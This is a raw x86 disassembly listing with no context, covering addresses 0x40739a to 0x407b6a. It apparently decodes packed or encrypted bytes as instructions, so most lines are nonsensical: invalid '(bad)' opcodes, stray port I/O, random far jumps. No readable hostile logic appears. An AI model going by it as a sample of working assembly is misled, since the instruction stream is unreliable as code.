  40739a:	mov    esp,0x664592ac
  40739f:	mov    ah,0x2e
  4073a1:	loope  0x4073ef
  4073a3:	jg     0x4073cd
  4073a5:	jp     0x40734d
  4073a7:	pushf  
  4073a8:	mov    ecx,0xae924a97
  4073ad:	or     bl,cl
  4073af:	sub    BYTE PTR [esi+0x58c3fb64],0x67
  4073b6:	mov    DWORD PTR [ecx-0x2c4385d7],eax
  4073bc:	ret    
  4073bd:	(bad)  
  4073be:	jp     0x407352
  4073c0:	push   ss
  4073c1:	loope  0x40740f
  4073c3:	imul   edi,DWORD PTR [ecx],0x776cb01d
  4073c9:	push   esp
  4073ca:	dec    edx
  4073cb:	bound  esi,QWORD PTR [ebx-0x3e7d194a]
  4073d1:	or     al,0x9e
  4073d3:	sbb    eax,0x55b2da04
  4073d8:	ror    BYTE PTR [esp+ecx*4],0x42
  4073dc:	mov    bh,0x1e
  4073de:	mov    ebx,0xa5f02955
  4073e3:	jnp    0x407423
  4073e5:	out    0x52,eax
  4073e7:	test   DWORD PTR [eax],ebp
  4073e9:	rcr    BYTE PTR [ebp+0x5ae73e53],1
  4073ef:	test   DWORD PTR [esi],ebp
  4073f1:	icebp  
  4073f2:	pop    ebp
  4073f3:	sub    BYTE PTR ds:[ebx],cl
  4073f6:	mov    ebp,0xb20d389c
  4073fb:	xor    ch,dh
  4073fd:	adc    al,0x4a
  4073ff:	sub    cl,al
  407401:	lock lods al,BYTE PTR ds:[esi]
  407403:	jnp    0x40741f
  407405:	dec    ebx
  407406:	fisubr DWORD PTR [edi+0x45]
  407409:	mov    ebx,DWORD PTR fs:[esi+0x7a2507d5]
  407410:	(bad)  
  407411:	sbb    BYTE PTR [ebx-0x5bf14159],cl
  407417:	xchg   ebx,eax
  407418:	lahf   
  407419:	lock xor eax,0xac802892
  40741f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407420:	aad    0xe3
  407422:	dec    esp
  407423:	push   0x6b4c0d39
  407428:	(bad)  
  407429:	test   DWORD PTR [edx-0x7e],0x93000ebe
  407430:	dec    edx
  407431:	push   es
  407432:	gs call 0x67be:0x6064e134
  40743a:	rcl    BYTE PTR [edx+ebx*4-0x39db01c9],1
  407441:	jne    0x4073e8
  407443:	mov    ebx,0x6fa536de
  407448:	rcr    DWORD PTR [eax],0xef
  40744b:	jl     0x407436
  40744d:	pop    esi
  40744e:	out    dx,eax
  40744f:	rcl    BYTE PTR [edi],cl
  407451:	xor    DWORD PTR [ebp+0x3],ebx
  407454:	xchg   ebp,eax
  407455:	mul    DWORD PTR [esi-0x6d]
  407458:	cs loope 0x4074a7
  40745b:	aas    
  40745c:	push   0x9efcec41
  407461:	sub    esi,DWORD PTR [edx]
  407463:	ins    BYTE PTR es:[edi],dx
  407464:	stc    
  407465:	retf   
  407466:	inc    esp
  407467:	lock scas al,BYTE PTR es:[edi]
  407469:	loope  0x4074c6
  40746b:	pusha  
  40746c:	aas    
  40746d:	out    0x2c,eax
  40746f:	int    0xd6
  407471:	cdq    
  407472:	pop    edx
  407473:	test   BYTE PTR [esi],ch
  407475:	loope  0x4074c3
  407477:	outs   dx,DWORD PTR ds:[esi]
  407478:	aas    
  407479:	out    0x3c,eax
  40747b:	lds    eax,FWORD PTR [ebx-0x1f]
  40747e:	pop    edx
  40747f:	xchg   edx,eax
  407480:	sub    BYTE PTR [edx-0x60],bh
  407483:	xchg   esp,eax
  407484:	in     eax,dx
  407485:	not    BYTE PTR [edx-0x7e]
  407488:	stc    
  407489:	test   al,0xf8
  40748b:	push   edi
  40748c:	repz mov ebp,0x873fdf01
  407492:	xchg   esi,eax
  407493:	(bad)  
  407494:	je     0x4074af
  407496:	mov    bl,0x94
  407498:	ds in  eax,0x44
  40749b:	test   dl,bh
  40749d:	cmp    dh,BYTE PTR [ebx-0xc]
  4074a0:	cs loope 0x4074ef
  4074a3:	(bad)  
  4074a5:	out    0x5c,eax
  4074a7:	lds    edi,FWORD PTR [eax]
  4074a9:	scas   al,BYTE PTR es:[edi]
  4074aa:	pop    ebx
  4074ab:	cmp    BYTE PTR [esi],0x91
  4074ae:	pop    edx
  4074af:	test   BYTE PTR [edx+0x3f61bbf0],ch
  4074b5:	out    0x4c,eax
  4074b7:	or     eax,0x425b192f
  4074bc:	out    dx,al
  4074bd:	push   ds
  4074be:	mov    cl,0x94
  4074c0:	shr    DWORD PTR [esi],0xac
  4074c3:	jnp    0x407503
  4074c5:	out    0x18,eax
  4074c7:	in     eax,0xbf
  4074c9:	call   FWORD PTR [edx-0x6e]
  4074cc:	es icebp 
  4074ce:	dec    ebp
  4074cf:	add    eax,0xb4ca4c28
  4074d4:	sahf   
  4074d5:	xlat   BYTE PTR ds:[ebx]
  4074d6:	dec    edx
  4074d7:	imul   BYTE PTR [eax]
  4074d9:	out    0xb2,al
  4074db:	xchg   esi,eax
  4074dc:	push   cs
  4074dd:	or     eax,0xf1611428
  4074e2:	mov    bl,0x53
  4074e4:	cmp    BYTE PTR [ebp-0x34],bh
  4074e7:	aam    0xaf
  4074e9:	fisttp WORD PTR [edx-0x6a]
  4074ec:	imul   ecx,DWORD PTR ss:[ecx+0x1f],0xc4dae73c
  4074f4:	repnz or DWORD PTR [ebx-0x7c],ebx
  4074f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074fa:	fsubr  QWORD PTR [eax-0x754f9350]
  407500:	ds out 0x7a,eax
  407503:	test   BYTE PTR [edi+0x3e0a5aaf],dh
  407509:	out    0x62,eax
  40750b:	test   BYTE PTR [edx+eiz*2-0x1815b9a5],ch
  407512:	push   edx
  407513:	test   BYTE PTR [ecx],dl
  407515:	(bad)  
  407516:	mov    bl,BYTE PTR [edx*8-0x3685eef9]
  40751d:	sbb    BYTE PTR [ebx-0x5bacb171],cl
  407523:	pop    ds
  407524:	cmp    BYTE PTR [ebx],ch
  407526:	jp     0x40751d
  407528:	sub    al,0x5
  40752a:	pop    esi
  40752b:	mov    WORD PTR [edi+0x62],cs
  40752e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40752f:	xchg   DWORD PTR [esi+0x2f877963],edi
  407535:	in     eax,0x70
  407537:	add    ah,BYTE PTR [edx]
  407539:	fld    DWORD PTR [esi-0x6c]
  40753c:	cmp    al,0x8f
  40753e:	das    
  40753f:	jge    0x4075be
  407541:	xchg   edi,eax
  407542:	dec    ecx
  407543:	push   ds
  407544:	ds repnz mov al,0x1d
  407548:	in     al,dx
  407549:	add    edx,esi
  40754b:	push   esp
  40754c:	push   es
  40754d:	add    ebx,DWORD PTR [edx]
  40754f:	mov    al,fs:0xf84a8424
  407555:	sti    
  407556:	sbb    DWORD PTR [eax-0x779f200],0x41c459f4
  407560:	inc    eax
  407561:	xchg   BYTE PTR [esi+0x6f],ah
  407564:	mov    dh,0x79
  407566:	mov    BYTE PTR [eax+0x7cfce9e5],cl
  40756c:	hlt    
  40756d:	mov    ebx,0xaf2a4c84
  407572:	inc    eax
  407573:	mov    al,ds:0xd6b79ca
  407578:	and    bl,BYTE PTR [edx-0x797b57a2]
  40757e:	pop    es
  40757f:	jne    0x4075d9
  407581:	pop    ds
  407582:	push   edx
  407583:	into   
  407584:	jp     0x40757d
  407586:	xchg   esi,eax
  407587:	sub    eax,0x75ffea41
  40758c:	mov    bh,0xcd
  40758e:	mov    ds:0xf8908e22,al
  407593:	add    al,0x92
  407595:	ss dec edx
  407597:	jmp    0x4075c7
  407599:	shr    DWORD PTR [ebp-0x73708f6b],cl
  40759f:	cmc    
  4075a0:	lods   eax,DWORD PTR ds:[esi]
  4075a1:	mov    ecx,0xfaba02a9
  4075a6:	inc    ebp
  4075a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075a8:	pop    edi
  4075a9:	xchg   DWORD PTR [esi+0x64151590],ecx
  4075af:	sub    edi,edx
  4075b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075b2:	dec    edx
  4075b3:	clc    
  4075b4:	cmc    
  4075b5:	fs and eax,0xfe37f8a4
  4075bb:	push   esi
  4075bc:	jmp    0x7ac3:0xb444d37f
  4075c3:	and    al,0x3c
  4075c5:	repz ret 0xa486
  4075c9:	jns    0x407561
  4075cb:	sbb    dh,bh
  4075cd:	es jmp 0x40757c
  4075d0:	cmp    al,0xf1
  4075d2:	pop    esi
  4075d3:	neg    BYTE PTR [edx]
  4075d5:	and    edi,DWORD PTR [edi]
  4075d7:	nop
  4075d8:	ss jmp 0xad0b:0x9db8b8ca
  4075e0:	push   ds
  4075e1:	(bad)
  4075e4:	jb     0x40765d
  4075e6:	adc    ecx,DWORD PTR [esi-0x53bd04c6]
  4075ec:	mov    edx,0x5f9ef1ce
  4075f1:	ja     0x40763d
  4075f3:	inc    esp
  4075f4:	mov    al,0xf2
  4075f6:	inc    edx
  4075f7:	cs inc eax
  4075f9:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4075fb:	cmp    eax,0x868a9799
  407600:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407601:	clc    
  407602:	mov    dl,BYTE PTR [edi+eiz*8+0x1c84447f]
  407609:	hlt    
  40760a:	fwait
  40760b:	ss sub ebp,ebp
  40760e:	inc    esi
  40760f:	add    al,0x60
  407611:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407612:	icebp  
  407613:	cli    
  407614:	mov    esi,0x3cc43cd7
  407619:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40761a:	push   ecx
  40761b:	icebp  
  40761c:	hlt    
  40761d:	add    DWORD PTR [esi],eax
  40761f:	ins    BYTE PTR es:[edi],dx
  407620:	sbb    eax,0x1c46ab87
  407625:	sub    cl,BYTE PTR [esp+esi*1+0x4e]
  407629:	inc    esi
  40762a:	cld    
  40762b:	mov    WORD PTR [esi-0x7d],?
  40762e:	jp     0x407632
  407630:	mul    BYTE PTR [esi+0x36290f2]
  407636:	jp     0x4075cb
  407638:	stc    
  407639:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40763a:	mov    ebp,0x41af8c4c
  40763f:	inc    esp
  407640:	sbb    al,0x33
  407642:	fsub   DWORD PTR [ecx]
  407644:	mov    edx,0xe6b252b7
  407649:	cmp    DWORD PTR [edx+0x4e],edx
  40764c:	pop    ss
  40764d:	iret   
  40764e:	pushf  
  40764f:	mov    dh,0x2e
  407651:	lahf   
  407652:	xor    eax,ecx
  407654:	loop   0x4076bd
  407656:	xor    dl,ch
  407658:	cmp    al,0xb3
  40765a:	push   ecx
  40765b:	scas   eax,DWORD PTR es:[edi]
  40765c:	scas   eax,DWORD PTR es:[edi]
  40765d:	jnp    0x4075e1
  40765f:	shl    DWORD PTR [eax+0x13],cl
  407662:	ret    
  407663:	int    0x7a
  407665:	push   edx
  407666:	fwait
  407667:	rol    BYTE PTR [eax+edi*2-0x4e],1
  40766b:	test   BYTE PTR [eax-0x6f],ch
  40766e:	cmp    al,0xa0
  407670:	aas    
  407671:	lea    esp,[ecx]
  407673:	pop    edx
  407674:	lods   al,BYTE PTR ds:[esi]
  407675:	push   ebp
  407676:	jle    0x407601
  407678:	pop    ecx
  407679:	call   0xa7d:0x343e3db8
  407680:	mov    ebx,0x3f93ea05
  407685:	jns    0x407665
  407687:	jno    0x407609
  407689:	dec    esi
  40768a:	jne    0x4076c5
  40768c:	in     al,0xe7
  40768e:	fiadd  DWORD PTR [edx-0x63]
  407691:	lods   al,BYTE PTR ds:[esi]
  407692:	pushf  
  407693:	repz cs out 0xdd,al
  407697:	xchg   esi,eax
  407698:	les    esp,FWORD PTR [esi-0x1de155ac]
  40769e:	sub    ah,dh
  4076a0:	mov    fs,esi
  4076a2:	ret    0xa10a
  4076a5:	fwait
  4076a6:	bound  ebp,QWORD PTR [ebx]
  4076a8:	xlat   BYTE PTR ds:[ebx]
  4076a9:	aam    0x3c
  4076ab:	imul   esp,DWORD PTR [edx-0x6155aafb],0xdf5aff28
  4076b5:	loopne 0x407731
  4076b7:	mov    edx,0xf10fec64
  4076bc:	pop    edi
  4076bd:	cmp    ch,cl
  4076bf:	jl     0x4076ff
  4076c1:	leave  
  4076c2:	xchg   edi,eax
  4076c3:	(bad)  
  4076c4:	or     DWORD PTR [eax-0x18c9b81e],ebp
  4076ca:	(bad)  
  4076cb:	out    dx,al
  4076cc:	jae    0x4076fd
  4076ce:	fisubr DWORD PTR [esi-0x3b]
  4076d1:	xchg   edi,eax
  4076d2:	and    BYTE PTR [ebx+0x50],bl
  4076d5:	push   cs
  4076d6:	pop    ebp
  4076d7:	cs push cs
  4076d9:	mul    DWORD PTR [ebx+0x70e67a26]
  4076df:	dec    esi
  4076e0:	js     0x4076a5
  4076e2:	dec    edi
  4076e3:	int    0xfb
  4076e5:	adc    DWORD PTR [edx+0x67c8f8b3],edx
  4076eb:	mov    dh,0x1e
  4076ed:	mov    al,0x5b
  4076ef:	das    
  4076f0:	(bad)  
  4076f2:	mov    esi,0x97db92bf
  4076f7:	enter  0xf5b1,0x53
  4076fb:	scas   eax,DWORD PTR es:[edi]
  4076fc:	push   edi
  4076fd:	cdq    
  4076fe:	pop    edx
  4076ff:	jbe    0x4076d4
  407701:	mov    edi,0x48d8b01a
  407706:	jge    0x40768c
  407708:	or     ch,BYTE PTR [ebx+0x30]
  40770b:	fsub   DWORD PTR [ecx]
  40770d:	push   edi
  40770e:	push   ds
  40770f:	jb     0x4076b2
  407711:	out    0xcf,al
  407713:	pop    ss
  407714:	out    0x4c,eax
  407716:	nop    DWORD PTR [esi+0x4484320f]
  40771d:	outs   dx,DWORD PTR ds:[esi]
  40771e:	fnstcw WORD PTR [edi-0x29f3c8c1]
  407724:	and    eax,0x795533f6
  407729:	out    0xd0,eax
  40772b:	sub    esi,DWORD PTR [eax-0x4a]
  40772e:	and    esp,0xfffffff1
  407731:	shr    cl,0xc2
  407734:	pop    edi
  407735:	pop    eax
  407736:	pop    eax
  407737:	pop    esi
  407738:	imul   ebx,DWORD PTR [ebp+0x7d],0xbae7d192
  40773f:	aaa    
  407740:	dec    edx
  407741:	(bad)  
  407742:	leave  
  407743:	and    eax,0x1459a7f9
  407748:	and    eax,0x7a8c5a31
  40774d:	cmp    DWORD PTR [esi-0x4ccff571],edi
  407753:	mov    ebx,0x434648c
  407758:	out    dx,eax
  407759:	jle    0x4076e4
  40775b:	xchg   ebp,eax
  40775c:	add    edi,esp
  40775e:	pop    ebx
  40775f:	fdivr  st(3),st
  407761:	mov    dh,0x46
  407763:	mov    ch,0x86
  407765:	pushf  
  407766:	push   esi
  407767:	test   DWORD PTR [edx+0x4266d792],esp
  40776d:	mov    edi,0x59655315
  407772:	iret   
  407773:	xchg   DWORD PTR [ebp+0x6f],esi
  407776:	cmp    ebp,DWORD PTR [ebx+ecx*1]
  407779:	out    0x92,al
  40777b:	pop    ecx
  40777c:	push   ebp
  40777d:	mov    ecx,0xe2ea5ba7
  407782:	jl     0x40770a
  407784:	jne    0x407720
  407786:	pop    ebp
  407787:	add    al,0x7f
  407789:	out    0xdf,al
  40778b:	dec    edi
  40778c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40778d:	push   ds
  40778e:	iret   
  40778f:	rcl    eax,1
  407791:	jne    0x4077b9
  407793:	test   BYTE PTR [ebp+0x3fd3ee89],ah
  407799:	fwait
  40779a:	cmp    edx,0x39fd4c15
  4077a0:	int3   
  4077a1:	out    0x9a,al
  4077a3:	xchg   BYTE PTR [edi-0x58f8b67a],bh
  4077a9:	das    
  4077aa:	mov    dh,cl
  4077ac:	mov    cl,0x5d
  4077ae:	pop    ebx
  4077af:	xor    dl,dl
  4077b1:	and    cl,BYTE PTR [edx+0x28]
  4077b4:	fcomp  DWORD PTR [edi+0x57]
  4077b7:	test   al,bh
  4077b9:	add    bh,BYTE PTR [ebx+0xd]
  4077bc:	aas    
  4077bd:	dec    edi
  4077be:	mov    eax,0xb784475d
  4077c3:	push   ds
  4077c4:	push   ds
  4077c5:	out    0xfa,eax
  4077c7:	imul   ebx,DWORD PTR [ecx+0x49e7796],0x70
  4077ce:	call   0xd50c:0x4530baed
  4077d5:	and    eax,DWORD PTR [edi]
  4077d7:	add    eax,0x359c00b2
  4077dc:	pusha  
  4077dd:	std    
  4077de:	out    0xd9,eax
  4077e0:	ds mov esp,0x4e0bffed
  4077e6:	jmp    0xbf48:0xd33f01b5
  4077ed:	test   eax,0x46089ab2
  4077f2:	mov    edx,DWORD PTR [esi]
  4077f4:	mov    al,ds:0x44874d17
  4077f9:	cdq    
  4077fa:	ss jne 0x40787c
  4077fd:	sub    dh,ch
  4077ff:	dec    esp
  407800:	jecxz  0x407844
  407802:	push   esp
  407803:	push   esp
  407804:	mov    esp,0xdf88a045
  407809:	shl    BYTE PTR [ebx-0x1e22e9c0],1
  40780f:	xchg   DWORD PTR [ebx+0x78],esp
  407812:	and    BYTE PTR [ecx+0x7],0x0
  407816:	mov    eax,ds:0xfb2e8c85
  40781b:	in     al,0x60
  40781d:	aas    
  40781e:	int    0x85
  407820:	repz adc BYTE PTR [eax+0x7b],ch
  407824:	aas    
  407825:	loope  0x407819
  407827:	cmc    
  407828:	ret    
  407829:	inc    ebp
  40782a:	fist   WORD PTR [eax]
  40782c:	aaa    
  40782d:	cli    
  40782e:	enter  0xa502,0xe8
  407832:	aad    0xa1
  407834:	xchg   BYTE PTR [edi],ch
  407836:	sbb    BYTE PTR [edi+0x150fb6dd],dh
  40783c:	cmp    DWORD PTR [ebx],ebx
  40783e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40783f:	loopne 0x40782c
  407841:	loop   0x4078a0
  407843:	jns    0x4078b8
  407845:	loop   0x407827
  407847:	les    ecx,FWORD PTR [esi-0x6b22edf3]
  40784d:	out    0xb0,al
  40784f:	mov    edx,0x4af4db08
  407854:	aas    
  407855:	pop    ecx
  407856:	mov    dh,0xec
  407858:	pop    dx
  40785a:	scas   eax,DWORD PTR es:[edi]
  40785b:	ds xchg ecx,eax
  40785d:	out    0x8,al
  40785f:	cld    
  407860:	xchg   edx,eax
  407861:	cmp    bl,BYTE PTR [ecx-0xa]
  407864:	loopne 0x407835
  407866:	fidiv  DWORD PTR [edx+0x2c46bec3]
  40786c:	push   eax
  40786d:	sti    
  40786e:	test   BYTE PTR [ebx+ecx*1-0x1a],0x4a
  407873:	mov    eax,0xccaae23e
  407878:	xchg   ebx,eax
  407879:	out    dx,al
  40787a:	sbb    BYTE PTR [si+0x5a50],dl
  40787f:	scas   al,BYTE PTR es:[edi]
  407880:	sbb    bh,BYTE PTR [ecx+0xf]
  407883:	jmp    0x40784f
  407885:	xor    edx,DWORD PTR [ebp-0xc]
  407888:	addr16 pop ebp
  40788a:	pop    edx
  40788b:	push   cs
  40788c:	jo     0x4078cf
  40788e:	sbb    al,0xb9
  407890:	mov    DWORD PTR [edi+0x55],0x2f02beaa
  407897:	jp     0x4078ae
  407899:	xor    bl,BYTE PTR [ebp+0x18e6dfe3]
  40789f:	jo     0x407886
  4078a1:	and    al,0xef
  4078a3:	xchg   ebx,eax
  4078a4:	xchg   ebx,eax
  4078a5:	pop    eax
  4078a6:	fwait
  4078a7:	jp     0x4078ef
  4078a9:	fsub   DWORD PTR [esi]
  4078ab:	mov    ?,WORD PTR [esi]
  4078ad:	and    ebp,DWORD PTR [edx]
  4078af:	jg     0x4078dd
  4078b1:	xchg   ebx,eax
  4078b2:	das    
  4078b3:	in     al,dx
  4078b4:	push   esp
  4078b5:	inc    eax
  4078b6:	jno    0x407873
  4078b8:	lea    ecx,[eax+0x4f]
  4078bb:	add    eax,0xb2813388
  4078c0:	mul    BYTE PTR [eax+0x5a]
  4078c3:	call   0x76b8:0xcf252686
  4078ca:	jns    0x407851
  4078cc:	cwde   
  4078cd:	data16 fild DWORD PTR [esi]
  4078d0:	push   cs
  4078d1:	fidivr DWORD PTR [esp+edi*1-0x29a44db5]
  4078d8:	jge    0x4078a5
  4078da:	mov    ds:0xe6e7d173,eax
  4078df:	inc    ebp
  4078e0:	sub    al,0x35
  4078e2:	pop    ebp
  4078e3:	int    0x72
  4078e5:	adc    cl,0xd2
  4078e8:	dec    ecx
  4078e9:	fcomp  QWORD PTR [ebx-0x4c]
  4078ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078ed:	cmp    BYTE PTR [edx+ebp*4],dl
  4078f0:	fadd   DWORD PTR [eax]
  4078f2:	sub    al,BYTE PTR [ebp+0x579007b3]
  4078f8:	aas    
  4078f9:	das    
  4078fa:	(bad)  
  4078fb:	push   0x6de9615a
  407900:	mov    ds:0xc444012b,al
  407905:	push   ds
  407906:	jge    0x40788b
  407908:	adc    eax,0x8dfd298f
  40790d:	cbw    
  40790f:	mov    ecx,0x110887ea
  407914:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407915:	ja     0x407971
  407917:	pusha  
  407918:	xor    eax,0x66ef3820
  40791d:	arpl   cx,bx
  40791f:	xchg   DWORD PTR [eax],esp
  407921:	sub    eax,0x5fb75378
  407926:	sbb    BYTE PTR ds:0x5b209c0,dl
  40792c:	xor    BYTE PTR [esi-0x45440da6],ah
  407932:	out    0xf5,eax
  407934:	jle    0x407974
  407936:	push   0xffffff8a
  407938:	leave  
  407939:	loope  0x40792e
  40793b:	pop    ecx
  40793c:	pop    esi
  40793d:	or     al,BYTE PTR ds:0x4b0d206e
  407943:	xor    dh,bl
  407945:	mov    al,ds:0x9665e24d
  40794a:	jge    0x40795c
  40794c:	push   0xffffffe6
  40794e:	pop    eax
  40794f:	inc    esp
  407950:	jo     0x40797b
  407952:	sub    edx,DWORD PTR [eax-0x59ac5fd8]
  407958:	xchg   edx,eax
  407959:	cdq    
  40795a:	pop    ebx
  40795b:	xor    BYTE PTR [ebx-0x73],dh
  40795e:	xlat   BYTE PTR ds:[ebx]
  40795f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407960:	push   cs
  407961:	push   ss
  407962:	leave  
  407963:	add    DWORD PTR [esi+ebx*2],0xffffff8a
  407967:	pop    edi
  407968:	rol    BYTE PTR [ebx-0x35],0x3
  40796c:	ds leave 
  40796e:	mov    esi,0x107cd50
  407973:	add    DWORD PTR [ecx-0x19],esp
  407976:	cli    
  407977:	rcl    esi,cl
  407979:	cmp    BYTE PTR [esi+0x66],cl
  40797c:	or     BYTE PTR [ecx],cl
  40797e:	push   esi
  40797f:	in     eax,0xec
  407981:	cmp    al,0x58
  407983:	adc    al,0xcf
  407985:	or     ch,BYTE PTR [ebx]
  407987:	fs out 0xe0,al
  40798a:	jmp    0xe7a:0x8b25ff2d
  407991:	cwde   
  407992:	or     ebp,edx
  407994:	xor    DWORD PTR [ebp-0x35],eax
  407997:	std    
  407998:	icebp  
  407999:	pop    ebx
  40799a:	mov    al,ds:0x1b041a6a
  40799f:	jp     0x4079d5
  4079a1:	jl     0x4079e7
  4079a3:	test   BYTE PTR [ecx-0x44],dl
  4079a6:	and    BYTE PTR [ebx+0x77c99531],ah
  4079ac:	outs   dx,DWORD PTR ds:[esi]
  4079ad:	in     eax,0x31
  4079af:	sub    esi,DWORD PTR [ecx+0x1b]
  4079b2:	gs inc ebp
  4079b4:	stc    
  4079b5:	out    0xc2,al
  4079b7:	xchg   esi,eax
  4079b8:	cmp    al,0x17
  4079ba:	add    al,0x6
  4079bc:	mov    al,0xe2
  4079be:	mov    BYTE PTR [edi],bl
  4079c0:	ins    DWORD PTR es:[edi],dx
  4079c1:	arpl   WORD PTR [edx-0x54],dx
  4079c4:	mov    esi,0x1fdde046
  4079c9:	out    0x8a,al
  4079cb:	sbb    ah,bl
  4079cd:	dec    esi
  4079ce:	sub    dh,bl
  4079d0:	push   edx
  4079d1:	pop    es
  4079d2:	lea    edx,[esi-0x72]
  4079d5:	jae    0x407a31
  4079d7:	mov    dh,0x74
  4079d9:	clc    
  4079da:	mov    esi,0xad14825a
  4079df:	xchg   BYTE PTR [ebx],ah
  4079e1:	icebp  
  4079e2:	mov    BYTE PTR [ecx+0x7c],ah
  4079e5:	icebp  
  4079e6:	push   ebx
  4079e7:	inc    ebp
  4079e8:	sahf   
  4079e9:	ss pop edx
  4079eb:	outs   dx,BYTE PTR ds:[esi]
  4079ec:	fimul  WORD PTR [ecx+0x17]
  4079ef:	sub    cl,BYTE PTR [esi-0x41]
  4079f2:	cli    
  4079f3:	test   BYTE PTR [ebx-0x2a18ca8f],ah
  4079f9:	xchg   edi,esp
  4079fb:	mov    cl,0xf3
  4079fd:	int    0x5b
  4079ff:	jo     0x4079f5
  407a01:	stc    
  407a02:	mov    ?,WORD PTR fs:[eax+edx*8-0xd4e009b]
  407a0a:	pop    edx
  407a0b:	dec    edx
  407a0c:	pop    eax
  407a0d:	fisubr DWORD PTR [ebx+0xf]
  407a10:	out    0x3d,eax
  407a12:	pop    ebx
  407a13:	push   edx
  407a14:	xchg   ecx,eax
  407a15:	cdq    
  407a16:	push   edx
  407a17:	imul   ecx,eax,0x5584b3f5
  407a1d:	jb     0x407a14
  407a1f:	stc    
  407a20:	cmp    al,0x21
  407a22:	lock lds edx,FWORD PTR [ebx]
  407a25:	out    dx,al
  407a26:	call   0x96e:0x9e7cecad
  407a2d:	out    0x9a,al
  407a2f:	rol    DWORD PTR [edx],0x8a
  407a32:	xlat   BYTE PTR ds:[ebx]
  407a33:	cmc    
  407a34:	mov    al,ds:0xb4bc3509
  407a39:	dec    edi
  407a3a:	pop    edx
  407a3b:	sbb    BYTE PTR [edx-0x2bfd1eab],bl
  407a41:	scas   al,BYTE PTR es:[edi]
  407a42:	std    
  407a43:	test   DWORD PTR [esi-0x34],ebx
  407a46:	or     eax,0x3337a7b0
  407a4b:	nop
  407a4c:	jb     0x407a48
  407a4e:	mov    edx,0xf4c7af85
  407a53:	sub    esi,esp
  407a55:	push   0xcc6a8531
  407a5a:	mov    bl,0x2c
  407a5c:	aas    
  407a5d:	and    DWORD PTR [ecx+0x8016e3d],esp
  407a63:	mov    ebx,0x7878e71b
  407a68:	es ins DWORD PTR es:[edi],dx
  407a6a:	jl     0x407ae1
  407a6c:	sti    
  407a6d:	scas   al,BYTE PTR es:[edi]
  407a6e:	gs leave 
  407a70:	add    al,0x61
  407a72:	jge    0x407a96
  407a74:	pushf  
  407a75:	gs inc esi
  407a77:	jmp    0xe749:0x3eb2a839
  407a7e:	cli    
  407a7f:	(bad)  
  407a80:	mov    esi,DWORD PTR [edx+0x6d]
  407a83:	mov    ebp,ss
  407a85:	lea    ecx,[ecx-0x46c2c09d]
  407a8b:	jle    0x407aa7
  407a8d:	add    BYTE PTR [eax],ah
  407a8f:	mov    ds:0xc3cae697,eax
  407a94:	adc    dh,BYTE PTR [eax]
  407a96:	inc    edi
  407a97:	ins    DWORD PTR es:[edi],dx
  407a98:	out    dx,al
  407a99:	xchg   ebx,eax
  407a9a:	pop    ds
  407a9b:	mov    eax,0x325b74d6
  407aa0:	popa   
  407aa1:	cmp    ah,bh
  407aa3:	sbb    BYTE PTR [edx-0x68],ah
  407aa6:	(bad)  [edx-0x6cea1940]
  407aac:	cs nop
  407aae:	std    
  407aaf:	int    0xe7
  407ab1:	mov    ah,0x5a
  407ab3:	add    BYTE PTR [ebp-0x13eaed4d],0x64
  407aba:	pushf  
  407abb:	cdq    
  407abc:	mov    edi,0x702fa813
  407ac1:	aas    
  407ac2:	(bad)  
  407ac3:	mov    ebx,esi
  407ac5:	fs pop ebx
  407ac7:	push   ds
  407ac8:	fs repz xchg edx,eax
  407acb:	and    eax,0x4d8ae6eb
  407ad0:	mov    ch,0x65
  407ad2:	in     al,0xcf
  407ad4:	sbb    bl,BYTE PTR ds:0xce919b49
  407ada:	pop    edx
  407adb:	les    ebx,FWORD PTR [edi-0x2d]
  407ade:	ins    BYTE PTR es:[edi],dx
  407adf:	push   ss
  407ae0:	ret    0xa955
  407ae3:	test   DWORD PTR [ebp-0x2c151df2],esp
  407ae9:	pop    edx
  407aea:	inc    esi
  407aeb:	cmp    BYTE PTR [eax+0x30a58b6],bh
  407af1:	xor    al,al
  407af3:	push   ss
  407af4:	add    al,0xe0
  407af6:	mov    dl,0xd9
  407af8:	mov    ecx,0x3ea0f4f9
  407afd:	jmp    DWORD PTR [ecx]
  407aff:	sub    eax,0x1311a230
  407b04:	(bad)  
  407b05:	out    0xb0,eax
  407b07:	mov    ds:0x6b6e9dbf,eax
  407b0c:	jnp    0x407b57
  407b0e:	adc    al,0x68
  407b10:	adc    dl,BYTE PTR [esi+0x5947aa21]
  407b16:	sbb    eax,0x5f7dd084
  407b1b:	add    esi,DWORD PTR [ebp-0x1a]
  407b1e:	(bad)  
  407b1f:	jno    0x407b93
  407b21:	and    eax,DWORD PTR [ebx]
  407b23:	cmp    cl,BYTE PTR [esi-0x26a786b]
  407b29:	clc    
  407b2a:	inc    edi
  407b2b:	in     al,dx
  407b2c:	(bad)  
  407b2d:	cmp    ch,BYTE PTR [edx]
  407b2f:	inc    esp
  407b30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b31:	or     dh,BYTE PTR [ecx-0xa]
  407b34:	mov    eax,0x8985572c
  407b39:	and    BYTE PTR [esi+0x72573107],bl
  407b3f:	sub    DWORD PTR [eax+0x9fadce1],0xdb6a9a5d
  407b49:	out    0x6a,al
  407b4b:	inc    esp
  407b4c:	mov    cl,0x90
  407b4e:	jb     0x407b54
  407b50:	sub    eax,0xefeca093
  407b55:	inc    esi
  407b56:	push   esp
  407b57:	adc    bh,BYTE PTR [ecx+0x3fd48b21]
  407b5d:	push   edx
  407b5e:	gs jne 0x407b2b
  407b61:	stc    
  407b62:	les    ebp,FWORD PTR [ebx+ecx*1+0x53]
  407b66:	push   ds
  407b67:	xchg   esi,eax
  407b68:	mov    bl,0x86
  407b6a:	pop    ebx
